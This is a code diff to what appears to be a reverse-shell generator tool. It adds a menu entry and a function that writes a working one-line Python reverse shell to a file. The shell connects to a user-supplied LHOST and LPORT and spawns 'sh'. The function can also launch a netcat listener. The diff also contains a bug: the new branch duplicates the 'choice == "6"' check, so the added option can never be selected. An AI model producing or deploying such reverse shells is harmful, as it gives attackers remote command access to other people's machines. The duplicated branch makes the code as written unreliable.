@@ -473,6 +473,7 @@ def python_menu():
 		print(Fore.BLUE + "4. Python 3 #2" + Style.RESET_ALL)
 		print(Fore.BLUE + "5. Python 3 Windows" + Style.RESET_ALL)
 		print(Fore.BLUE + "6. Python 3 Shortest" + Style.RESET_ALL)
+		print(Fore.BLUE + "7. Python 3 simple one line" + Style.RESET_ALL)
 		print(Fore.RED + "99. Back" + Style.RESET_ALL)
 		nl()
 		choice = input("Choose the shell you need! (1-6): ")
@@ -489,10 +490,62 @@ def python_menu():
 			generate_python_3_windows()
 		elif choice == "6":
 			generate_python_3_shortest()
+		elif choice == "6":
+			generate_python_3_simple()
 	except KeyboardInterrupt:
 		print("\nInterrupted, returning to main menu.....")
 		time.sleep(1)
 	main()
+
+def generate_python_3_simple():
+#	lhost = input("Enter LHOST: ")
+#	lport = input("Enter LPORT: ")
+	try:
+		while True:
+			lhost = input("Enter LHOST: ")
+			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
+				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
+				continue
+			break
+
+		while True:
+			lport = input("Enter LPORT: ")
+			if not lport.isdigit():
+				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
+				continue
+			break
+		filename = input("Enter filename: ")
+
+		command = f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")"""
+
+		save_choice = input("Save to working directory? (y/n): ")
+		if save_choice.lower() != "y":
+			path = input("Enter the path where you want to save the file: ")
+			filename = os.path.join(path, filename)
+
+		with open(filename, 'w') as f:
+			f.write(command)
+
+		print(f"File saved as {filename}")
+
+		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
+		if listener_choice.lower() == "y":
+			terminals = ["mate-terminal", "gnome-terminal"]
+			for terminal in terminals:
+				try:
+					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
+					break
+				except FileNotFoundError:
+					continue
+			else:
+				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
+		elif listener_choice.lower() == "n":
+			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
+			time.sleep(4)
+	except KeyboardInterrupt:
+		print("\nInterrupted, returning to menu...")
+		time.sleep(2)
+	python_menu()
 
 
 def generate_python_3_shortest():
